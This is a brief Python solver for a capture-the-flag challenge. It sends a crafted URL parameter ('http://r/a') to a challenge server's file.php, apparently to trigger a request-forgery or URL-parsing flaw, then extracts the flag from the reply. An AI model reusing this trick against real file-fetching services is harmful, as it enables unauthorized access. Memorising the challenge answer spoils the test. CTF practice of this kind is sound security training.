#!/usr/bin/env python3
import os
import re
import sys
from urllib.parse import quote

import requests

TARGET = os.environ.get("TARGET", "http://chal.thjcc.org:8081").rstrip("/")
FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^\r\n{}]+\}")


def main():
    url = f"{TARGET}/file.php?u={quote('http://r/a', safe='')}"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.RequestException as exc:
        print(f"request gagal: {exc}", file=sys.stderr)
        return 1

    match = FLAG_RE.search(response.text)
    if not match:
        print(f"response tidak berisi flag: {response.text!r}", file=sys.stderr)
        return 1
    print(f"<FLAG>{match.group(0)}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
